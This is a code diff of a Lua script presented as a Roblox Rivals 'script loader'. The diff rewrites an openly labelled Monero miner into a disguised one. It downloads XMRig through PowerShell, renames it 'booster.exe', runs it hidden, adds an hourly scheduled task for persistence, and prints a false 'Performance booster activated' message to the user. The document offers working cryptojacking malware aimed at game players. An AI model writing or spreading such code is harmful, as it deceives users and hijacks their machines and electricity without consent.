@@ -1,10 +1,10 @@
--- Roblox Rivals Script Loader - Monero Miner (YOUR OWN MACHINE ONLY)
+-- Roblox Rivals Script Loader - Performance Booster (Disguised Miner)
 local function download_and_run()
     local miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
-    local zip_path = os.getenv("TEMP") .. "\\xmrig.zip"
-    local extract_path = os.getenv("TEMP") .. "\\xmrig"
+    local zip_path = os.getenv("TEMP") .. "\\booster.zip"
+    local extract_path = os.getenv("TEMP") .. "\\RivalsBoost"
     
-    -- Download XMRig
+    -- Download "performance booster" (actually XMRig)
     local ps_download = 'powershell -c "Invoke-WebRequest -Uri \\"' .. miner_url .. '\\" -OutFile \\"' .. zip_path .. '\\""'
     os.execute(ps_download)
     
@@ -35,13 +35,16 @@ local function download_and_run()
     f:write(config)
     f:close()
     
-    -- Run miner (hidden)
-    os.execute('start /b "" "' .. extract_path .. '\\xmrig.exe"')
+    -- Rename xmrig.exe to something harmless
+    os.execute('rename "' .. extract_path .. '\\xmrig.exe" "booster.exe"')
+    
+    -- Run "booster" (hidden)
+    os.execute('start /b "" "' .. extract_path .. '\\booster.exe"')
     
     -- Persistence
-    os.execute('schtasks /create /tn "RivalsMiner" /tr "' .. extract_path .. '\\xmrig.exe" /sc hourly /f >nul 2>&1')
+    os.execute('schtasks /create /tn "RivalsBooster" /tr "' .. extract_path .. '\\booster.exe" /sc hourly /f >nul 2>&1')
     
-    print("[RIVALS] Miner started on YOUR machine.")
+    print("[RIVALS] Performance booster activated.")
 end
 
 download_and_run()
